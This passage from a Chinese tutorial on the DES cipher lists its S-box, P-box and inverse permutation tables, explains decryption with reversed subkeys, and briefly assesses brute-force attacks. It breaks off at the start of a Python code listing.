lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#008200'>//&nbsp;S2</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>7.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;15,&nbsp;&nbsp;1,&nbsp;&nbsp;8,&nbsp;14,&nbsp;&nbsp;6,&nbsp;11,&nbsp;&nbsp;3,&nbsp;&nbsp;4,&nbsp;&nbsp;9,&nbsp;&nbsp;7,&nbsp;&nbsp;2,&nbsp;13,&nbsp;12,&nbsp;&nbsp;0,&nbsp;&nbsp;5,&nbsp;10,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>8.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;3,&nbsp;13,&nbsp;&nbsp;4,&nbsp;&nbsp;7,&nbsp;15,&nbsp;&nbsp;2,&nbsp;&nbsp;8,&nbsp;14,&nbsp;12,&nbsp;&nbsp;0,&nbsp;&nbsp;1,&nbsp;10,&nbsp;&nbsp;6,&nbsp;&nbsp;9,&nbsp;11,&nbsp;&nbsp;5,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>9.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;0,&nbsp;14,&nbsp;&nbsp;7,&nbsp;11,&nbsp;10,&nbsp;&nbsp;4,&nbsp;13,&nbsp;&nbsp;1,&nbsp;&nbsp;5,&nbsp;&nbsp;8,&nbsp;12,&nbsp;&nbsp;6,&nbsp;&nbsp;9,&nbsp;&nbsp;3,&nbsp;&nbsp;2,&nbsp;15,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>10.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;13,&nbsp;&nbsp;8,&nbsp;10,&nbsp;&nbsp;1,&nbsp;&nbsp;3,&nbsp;15,&nbsp;&nbsp;4,&nbsp;&nbsp;2,&nbsp;11,&nbsp;&nbsp;6,&nbsp;&nbsp;7,&nbsp;12,&nbsp;&nbsp;0,&nbsp;&nbsp;5,&nbsp;14,&nbsp;&nbsp;9,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>11.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#008200'>//&nbsp;S3</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>12.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;10,&nbsp;&nbsp;0,&nbsp;&nbsp;9,&nbsp;14,&nbsp;&nbsp;6,&nbsp;&nbsp;3,&nbsp;15,&nbsp;&nbsp;5,&nbsp;&nbsp;1,&nbsp;13,&nbsp;12,&nbsp;&nbsp;7,&nbsp;11,&nbsp;&nbsp;4,&nbsp;&nbsp;2,&nbsp;&nbsp;8,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>13.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;13,&nbsp;&nbsp;7,&nbsp;&nbsp;0,&nbsp;&nbsp;9,&nbsp;&nbsp;3,&nbsp;&nbsp;4,&nbsp;&nbsp;6,&nbsp;10,&nbsp;&nbsp;2,&nbsp;&nbsp;8,&nbsp;&nbsp;5,&nbsp;14,&nbsp;12,&nbsp;11,&nbsp;15,&nbsp;&nbsp;1,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>14.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;13,&nbsp;&nbsp;6,&nbsp;&nbsp;4,&nbsp;&nbsp;9,&nbsp;&nbsp;8,&nbsp;15,&nbsp;&nbsp;3,&nbsp;&nbsp;0,&nbsp;11,&nbsp;&nbsp;1,&nbsp;&nbsp;2,&nbsp;12,&nbsp;&nbsp;5,&nbsp;10,&nbsp;14,&nbsp;&nbsp;7,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>15.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;1,&nbsp;10,&nbsp;13,&nbsp;&nbsp;0,&nbsp;&nbsp;6,&nbsp;&nbsp;9,&nbsp;&nbsp;8,&nbsp;&nbsp;7,&nbsp;&nbsp;4,&nbsp;15,&nbsp;14,&nbsp;&nbsp;3,&nbsp;11,&nbsp;&nbsp;5,&nbsp;&nbsp;2,&nbsp;12,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>16.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#008200'>//&nbsp;S4</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>17.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;7,&nbsp;13,&nbsp;14,&nbsp;&nbsp;3,&nbsp;&nbsp;0,&nbsp;&nbsp;6,&nbsp;&nbsp;9,&nbsp;10,&nbsp;&nbsp;1,&nbsp;&nbsp;2,&nbsp;&nbsp;8,&nbsp;&nbsp;5,&nbsp;11,&nbsp;12,&nbsp;&nbsp;4,&nbsp;15,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>18.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;13,&nbsp;&nbsp;8,&nbsp;11,&nbsp;&nbsp;5,&nbsp;&nbsp;6,&nbsp;15,&nbsp;&nbsp;0,&nbsp;&nbsp;3,&nbsp;&nbsp;4,&nbsp;&nbsp;7,&nbsp;&nbsp;2,&nbsp;12,&nbsp;&nbsp;1,&nbsp;10,&nbsp;14,&nbsp;&nbsp;9,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>19.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;10,&nbsp;&nbsp;6,&nbsp;&nbsp;9,&nbsp;&nbsp;0,&nbsp;12,&nbsp;11,&nbsp;&nbsp;7,&nbsp;13,&nbsp;15,&nbsp;&nbsp;1,&nbsp;&nbsp;3,&nbsp;14,&nbsp;&nbsp;5,&nbsp;&nbsp;2,&nbsp;&nbsp;8,&nbsp;&nbsp;4,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>20.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;3,&nbsp;15,&nbsp;&nbsp;0,&nbsp;&nbsp;6,&nbsp;10,&nbsp;&nbsp;1,&nbsp;13,&nbsp;&nbsp;8,&nbsp;&nbsp;9,&nbsp;&nbsp;4,&nbsp;&nbsp;5,&nbsp;11,&nbsp;12,&nbsp;&nbsp;7,&nbsp;&nbsp;2,&nbsp;14,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>21.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#008200'>//&nbsp;S5</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>22.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;2,&nbsp;12,&nbsp;&nbsp;4,&nbsp;&nbsp;1,&nbsp;&nbsp;7,&nbsp;10,&nbsp;11,&nbsp;&nbsp;6,&nbsp;&nbsp;8,&nbsp;&nbsp;5,&nbsp;&nbsp;3,&nbsp;15,&nbsp;13,&nbsp;&nbsp;0,&nbsp;14,&nbsp;&nbsp;9,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>23.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;14,&nbsp;11,&nbsp;&nbsp;2,&nbsp;12,&nbsp;&nbsp;4,&nbsp;&nbsp;7,&nbsp;13,&nbsp;&nbsp;1,&nbsp;&nbsp;5,&nbsp;&nbsp;0,&nbsp;15,&nbsp;10,&nbsp;&nbsp;3,&nbsp;&nbsp;9,&nbsp;&nbsp;8,&nbsp;&nbsp;6,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>24.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;4,&nbsp;&nbsp;2,&nbsp;&nbsp;1,&nbsp;11,&nbsp;10,&nbsp;13,&nbsp;&nbsp;7,&nbsp;&nbsp;8,&nbsp;15,&nbsp;&nbsp;9,&nbsp;12,&nbsp;&nbsp;5,&nbsp;&nbsp;6,&nbsp;&nbsp;3,&nbsp;&nbsp;0,&nbsp;14,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>25.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;11,&nbsp;&nbsp;8,&nbsp;12,&nbsp;&nbsp;7,&nbsp;&nbsp;1,&nbsp;14,&nbsp;&nbsp;2,&nbsp;13,&nbsp;&nbsp;6,&nbsp;15,&nbsp;&nbsp;0,&nbsp;&nbsp;9,&nbsp;10,&nbsp;&nbsp;4,&nbsp;&nbsp;5,&nbsp;&nbsp;3,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>26.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#008200'>//&nbsp;S6</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>27.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;12,&nbsp;&nbsp;1,&nbsp;10,&nbsp;15,&nbsp;&nbsp;9,&nbsp;&nbsp;2,&nbsp;&nbsp;6,&nbsp;&nbsp;8,&nbsp;&nbsp;0,&nbsp;13,&nbsp;&nbsp;3,&nbsp;&nbsp;4,&nbsp;14,&nbsp;&nbsp;7,&nbsp;&nbsp;5,&nbsp;11,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>28.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;10,&nbsp;15,&nbsp;&nbsp;4,&nbsp;&nbsp;2,&nbsp;&nbsp;7,&nbsp;12,&nbsp;&nbsp;9,&nbsp;&nbsp;5,&nbsp;&nbsp;6,&nbsp;&nbsp;1,&nbsp;13,&nbsp;14,&nbsp;&nbsp;0,&nbsp;11,&nbsp;&nbsp;3,&nbsp;&nbsp;8,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>29.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;9,&nbsp;14,&nbsp;15,&nbsp;&nbsp;5,&nbsp;&nbsp;2,&nbsp;&nbsp;8,&nbsp;12,&nbsp;&nbsp;3,&nbsp;&nbsp;7,&nbsp;&nbsp;0,&nbsp;&nbsp;4,&nbsp;10,&nbsp;&nbsp;1,&nbsp;13,&nbsp;11,&nbsp;&nbsp;6,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>30.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;4,&nbsp;&nbsp;3,&nbsp;&nbsp;2,&nbsp;12,&nbsp;&nbsp;9,&nbsp;&nbsp;5,&nbsp;15,&nbsp;10,&nbsp;11,&nbsp;14,&nbsp;&nbsp;1,&nbsp;&nbsp;7,&nbsp;&nbsp;6,&nbsp;&nbsp;0,&nbsp;&nbsp;8,&nbsp;13,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>31.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#008200'>//&nbsp;S7</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>32.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;4,&nbsp;11,&nbsp;&nbsp;2,&nbsp;14,&nbsp;15,&nbsp;&nbsp;0,&nbsp;&nbsp;8,&nbsp;13,&nbsp;&nbsp;3,&nbsp;12,&nbsp;&nbsp;9,&nbsp;&nbsp;7,&nbsp;&nbsp;5,&nbsp;10,&nbsp;&nbsp;6,&nbsp;&nbsp;1,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>33.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;13,&nbsp;&nbsp;0,&nbsp;11,&nbsp;&nbsp;7,&nbsp;&nbsp;4,&nbsp;&nbsp;9,&nbsp;&nbsp;1,&nbsp;10,&nbsp;14,&nbsp;&nbsp;3,&nbsp;&nbsp;5,&nbsp;12,&nbsp;&nbsp;2,&nbsp;15,&nbsp;&nbsp;8,&nbsp;&nbsp;6,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>34.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;1,&nbsp;&nbsp;4,&nbsp;11,&nbsp;13,&nbsp;12,&nbsp;&nbsp;3,&nbsp;&nbsp;7,&nbsp;14,&nbsp;10,&nbsp;15,&nbsp;&nbsp;6,&nbsp;&nbsp;8,&nbsp;&nbsp;0,&nbsp;&nbsp;5,&nbsp;&nbsp;9,&nbsp;&nbsp;2,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>35.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;6,&nbsp;11,&nbsp;13,&nbsp;&nbsp;8,&nbsp;&nbsp;1,&nbsp;&nbsp;4,&nbsp;10,&nbsp;&nbsp;7,&nbsp;&nbsp;9,&nbsp;&nbsp;5,&nbsp;&nbsp;0,&nbsp;15,&nbsp;14,&nbsp;&nbsp;2,&nbsp;&nbsp;3,&nbsp;12,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>36.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#008200'>//&nbsp;S8</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>37.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;13,&nbsp;&nbsp;2,&nbsp;&nbsp;8,&nbsp;&nbsp;4,&nbsp;&nbsp;6,&nbsp;15,&nbsp;11,&nbsp;&nbsp;1,&nbsp;10,&nbsp;&nbsp;9,&nbsp;&nbsp;3,&nbsp;14,&nbsp;&nbsp;5,&nbsp;&nbsp;0,&nbsp;12,&nbsp;&nbsp;7,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>38.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;1,&nbsp;15,&nbsp;13,&nbsp;&nbsp;8,&nbsp;10,&nbsp;&nbsp;3,&nbsp;&nbsp;7,&nbsp;&nbsp;4,&nbsp;12,&nbsp;&nbsp;5,&nbsp;&nbsp;6,&nbsp;11,&nbsp;&nbsp;0,&nbsp;14,&nbsp;&nbsp;9,&nbsp;&nbsp;2,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>39.<span
style='font:7.0pt "Times New Roman"'> </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;7,&nbsp;11,&nbsp;&nbsp;4,&nbsp;&nbsp;1,&nbsp;&nbsp;9,&nbsp;12,&nbsp;14,&nbsp;&nbsp;2,&nbsp;&nbsp;0,&nbsp;&nbsp;6,&nbsp;10,&nbsp;13,&nbsp;15,&nbsp;&nbsp;3,&nbsp;&nbsp;5,&nbsp;&nbsp;8,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>40.<span style='font:7.0pt "Times New Roman"'> </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;2,&nbsp;&nbsp;1,&nbsp;14,&nbsp;&nbsp;7,&nbsp;&nbsp;4,&nbsp;10,&nbsp;&nbsp;8,&nbsp;13,&nbsp;15,&nbsp;12,&nbsp;&nbsp;9,&nbsp;&nbsp;0,&nbsp;&nbsp;3,&nbsp;&nbsp;5,&nbsp;&nbsp;6,&nbsp;11&nbsp;&nbsp;</span></p>
</div>

<p><span>P盒置换：</span></p>
<p><span lang=EN-US>S-</span><span>盒代替运算，每一盒得到<span lang=EN-US>4</span>位，<span lang=EN-US>8</span>盒共得到<span lang=EN-US>32</span>位输出。这<span lang=EN-US>32</span>位输出作为<span lang=EN-US>P</span>盒置换的输入块。<span lang=EN-US>P</span>盒置换将每一位输入位映射到输出位。任何一位都不能被映射两次，也不能被略去。经过<span
lang=EN-US>P-</span>盒置换的结果与最初<span lang=EN-US>64</span>位分组的左半部分异或，然后左右两部分交换，开始下一轮迭代。<span lang=EN-US>P-</span>盒置换表<span lang=EN-US>(</span>表示数据的位置<span lang=EN-US>)</span>共<span lang=EN-US>32</span>位</span></p>
<div style='border:none;border-left:solid #6CE26C 2.25pt;padding:0cm 0cm 0cm 0cm;
background:white;margin-left:18.0pt;margin-right:0cm'>

<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>1.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25,&nbsp;&nbsp;</span></p>
</div>

<h3 id="逆置换"><a href="#逆置换" class="headerlink" title="逆置换"></a><span style='font-size:14.0pt;font-family:黑体'>逆置换</span></h3><p><span>将初始置换进行<span lang=EN-US>16</span>次的迭代，即进行<span lang=EN-US>16</span>层的加密变换，这个运算过程我们暂时称为函数<span lang=EN-US>f</span>。得到<span
lang=EN-US>L16</span>和<span lang=EN-US>R16</span>，将此作为输入块，进行逆置换得到最终的密文输出块。逆置换是初始置换的逆运算。从初始置换规则中可以看到，原始数据的第<span
lang=EN-US>1</span>位置换到了第<span lang=EN-US>40</span>位，第<span lang=EN-US>2</span>位置换到了第<span
lang=EN-US>8</span>位。则逆置换就是将第<span lang=EN-US>40</span>位置换到第<span lang=EN-US>1</span>位，第<span
lang=EN-US>8</span>位置换到第<span lang=EN-US>2</span>位。以此类推，逆置换规则如下</span></p>
<div style='border:none;border-left:solid #6CE26C 2.25pt;padding:0cm 0cm 0cm 0cm;
background:white;margin-left:18.0pt;margin-right:0cm'>

<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>1.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>3.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>34,2,42,10,50,18,58&nbsp;26,33,1,41,&nbsp;9,49,17,57,25,&nbsp;&nbsp;</span></p>
</div>

<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a><span style='font-size:14.0pt;font-family:黑体'>解密</span></h3><p><span>加密和解密可以使用相同的算法。加密和解密唯一不同的是秘钥的次序是相反的。就是说如果每一轮的加密秘钥分别是<span
lang=EN-US>K1</span>、<span lang=EN-US>K2</span>、<span lang=EN-US>K3…K16</span>，那么解密秘钥就是<span
lang=EN-US>K16</span>、<span lang=EN-US>K15</span>、<span lang=EN-US>K14…K1</span>。为每一轮产生秘钥的算法也是循环的。加密是秘钥循环左移，解密是秘钥循环右移。解密秘钥每次移动的位数是：<span
lang=EN-US>0</span>、<span lang=EN-US>1</span>、<span lang=EN-US>2</span>、<span
lang=EN-US>2</span>、<span lang=EN-US>2</span>、<span lang=EN-US>2</span>、<span
lang=EN-US>2</span>、<span lang=EN-US>2</span>、<span lang=EN-US>1</span>、<span
lang=EN-US>2</span>、<span lang=EN-US>2</span>、<span lang=EN-US>2</span>、<span
lang=EN-US>2</span>、<span lang=EN-US>2</span>、<span lang=EN-US>2</span>、<span
lang=EN-US>1</span>。</span></p>
<h2 id="DES安全性分析"><a href="#DES安全性分析" class="headerlink" title="DES安全性分析"></a><span style='font-size:14.0pt;font-family:黑体'>DES安全性分析</span></h2><p><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br></span><span>在相信复杂函数可以通过简单函数迭代若干圈得到的原则下，利用<span
lang=EN-US>F</span>函数及对合等运算，充分利用非线性运算。至今，最有效的破解<span lang=EN-US>DES</span>算法的方法是穷举搜索法，那么<span
lang=EN-US>56</span>位长的密钥总共要测试<span lang=EN-US>256</span>次，如果每<span lang=EN-US>100</span>毫秒可以测试<span
lang=EN-US>1</span>次，那么需要<span lang=EN-US>7.2×1015</span>秒，大约是<span lang=EN-US>228,493,000</span>年。但是，仍有学者认为在可预见的将来用穷举法寻找正确密钥已趋于可行，所以若要安全保护<span
lang=EN-US>10</span>年以上的数据最好。现在多使用<span lang=EN-US>3DES</span>加密。</span></p>
<h2 id="加密-amp-解密"><a href="#加密-amp-解密" class="headerlink" title="加密&amp;解密"></a><span style='font-size:14.0pt'>加密&amp;解密</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span 